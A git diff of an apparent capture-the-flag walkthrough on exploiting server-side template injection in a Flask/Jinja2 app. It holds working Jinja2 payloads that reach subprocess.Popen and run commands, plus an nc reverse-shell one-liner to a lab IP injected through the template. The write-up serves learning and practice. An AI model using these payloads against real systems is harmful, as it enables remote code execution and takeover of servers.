@@ -109,9 +109,11 @@ https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
 
 There are multiple methods found to achieve the RCE easily, but we will do it manually.  
 Started climbing the tree, by entering the following commands into the template, and reading the results from /archive.  
+
 ```
 {{"".__class__}}  
 ```
+
 <p align="center">
 <img width="780" alt="13" src="https://user-images.githubusercontent.com/21021400/145070401-a0ef6be0-ff4b-4e43-8e77-a6b49f9d7b27.png">
 </p>
@@ -119,6 +121,7 @@ Started climbing the tree, by entering the following commands into the template,
 ```
 {{"".__class__.__mro__}}  
 ```
+
 <p align="center">
 <img width="850" alt="14" src="https://user-images.githubusercontent.com/21021400/145070403-18429496-2db8-4a4b-b963-1d4db3cb64bf.png">
 </p>
@@ -126,6 +129,7 @@ Started climbing the tree, by entering the following commands into the template,
 ```
 {{"".__class__.__mro__[1]}}  
 ```
+
 <p align="center">
 <img width="792" alt="15" src="https://user-images.githubusercontent.com/21021400/145070404-c5cf216b-3009-4b20-b6ab-899dca191b72.png">
 </p>
@@ -133,6 +137,7 @@ Started climbing the tree, by entering the following commands into the template,
 ```
 {{"".__class__.__mro__[1].__subclasses__()}}  
 ```
+
 <p align="center">
 <img width="960" alt="16" src="https://user-images.githubusercontent.com/21021400/145070408-0ce406cc-1e4b-4a44-8993-84e99a95fb37.png">
 </p>
@@ -173,25 +178,31 @@ sed "s/, /\n/g"
 ```
  
 Combining the 4 together:  
+  
 ```
 cat results | sed 's/&gt;/>/g' | sed 's/&lt;/</g' | sed "s/&#39;/'/g" | sed "s/, /\n/g"  
 ```
+  
  <p align="center">
 <img width="373" alt="18" src="https://user-images.githubusercontent.com/21021400/145070411-cf71df60-3479-4c38-98ed-bc62497531ab.png">
 </p>
 
 Now that we have a beautiful list, let's look for subprocess module.  
+  
 ```
 cat results | sed 's/&gt;/>/g' | sed 's/&lt;/</g' | sed "s/&#39;/'/g" | sed "s/, /\n/g" | grep subprocess  
 ```
+  
 <p align="center">
 <img width="444" alt="19" src="https://user-images.githubusercontent.com/21021400/145070413-39804b1c-aa60-4afd-af55-19d26aed70cd.png">
 </p>
 
 Now let's get the line number of subprocess.Popen using grep with -n tag.
+  
 ```
 cat results | sed 's/&gt;/>/g' | sed 's/&lt;/</g' | sed "s/&#39;/'/g" | sed "s/, /\n/g" | grep subprocess -n  
 ```
+  
 <p align="center">
 <img width="481" alt="20" src="https://user-images.githubusercontent.com/21021400/145070414-696d4f87-a62b-44c7-bf44-8424cf60f390.png">
 </p>
@@ -200,17 +211,21 @@ subprocess.Popen is at line 408.
 However we need to substract 1 from the line number we got because the indexes do not align.  
 
 So the next command to inject into the template engine will be:  
+  
 ```
 {{"".__class__.__mro__[1].__subclasses__()[407]}}  
 ```
+  
 <p align="center">
 <img width="809" alt="21" src="https://user-images.githubusercontent.com/21021400/145070415-ea694684-f824-4a87-be4b-d3cdce1c281c.png">
 </p>
 
 We will try to execute 'whoami' as a POC:  
+  
  ```
 {{"".__class__.__mro__[1].__subclasses__()[407]('whoami', shell=True, stdout=-1).communicate()}}  
  ```
+  
 <p align="center">
 <img width="765" alt="22" src="https://user-images.githubusercontent.com/21021400/145070416-2fa1c596-9ebf-4873-81aa-ca7db1deb2be.png">
 </p>
@@ -219,9 +234,12 @@ We can see that it runs as "web".
 
 To get a reverse shell, we'll just replace the command with the reverse shell code.  
 Tried a few syntaxes of nc reverse shell payloads but only this on worked:  
+```
 rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f  
-
+```
+  
 Opened netcat on port 1234 and injected the following command:  
+  
  ```
 {{"".__class__.__mro__[1].__subclasses__()[407]('rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f', shell=True, stdout=-1).communicate()}}  
  ```
